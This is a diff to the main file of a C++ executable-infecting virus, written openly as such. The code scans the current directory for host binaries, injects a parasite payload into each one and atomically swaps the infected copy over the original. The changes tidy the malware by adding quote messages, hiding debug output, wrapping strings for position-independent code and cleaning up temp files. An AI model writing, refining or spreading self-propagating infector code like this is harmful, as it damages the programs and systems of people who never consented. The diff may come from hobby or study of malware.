@@ -13,11 +13,22 @@
 #include "redirection/entry_point.hh"
 
 int main(int argc, char* argv[], char* env[]) {
-  const char* str = STR_LITERAL("Running virus code1\n");
+  const char* quote1 = STR_LITERAL(
+      "If debugging is the process of removing software bugs, then programming "
+      "must be the process of putting them in. - Edsger Dijkstra\n");
+  const char* quote2 = STR_LITERAL(
+      "If carpenters made buildings the way programmers make programs, the "
+      "first woodpecker to come along would destroy all of civilization. - "
+      "Unknown programmer\n");
+
+  const char* str =
+      (reinterpret_cast<uintptr_t>(vt::common::get_parasite_start_address()) &
+       0x10000)
+          ? quote1
+          : quote2;
+
   vt::write(1, str, vt::strlen(str));
 
-  vt::printf("%x %x \n", vt::common::get_parasite_patch_address(),
-             vt::common::get_parasite_start_address());
   char dir[] = {'.', 0};
 
   for (auto it : vt::common::DirectoryIterator(dir)) {
@@ -34,6 +45,7 @@ int main(int argc, char* argv[], char* env[]) {
                       argv[0] + vt::strlen(argv[0]) - vt::strlen(host_path))) {
         continue;
       }
+
       vt::common::Mmap<PROT_READ> host_mapping(host_size, MAP_PRIVATE,
                                                host.handle(), 0);
       std::span<const std::byte> parasite(
@@ -58,12 +70,13 @@ int main(int argc, char* argv[], char* env[]) {
 
       if (vt::infector::atomic_swap_host(host.handle(), host_path,
                                          new_host.handle(), tmp)) {
-        vt::printf("infected %s\n", host_path);
+        vt::printf(STR_LITERAL("infected %%s\n"), host_path);
       } else {
-        vt::printf("failed to swap for %s\n", host_path);
+        vt::printf(STR_LITERAL("failed to swap for %%s\n"), host_path);
+        (void)vt::unlink(tmp);
       }
     }
   }
-  vt::printf("done\n");
+
   return 0;
 }
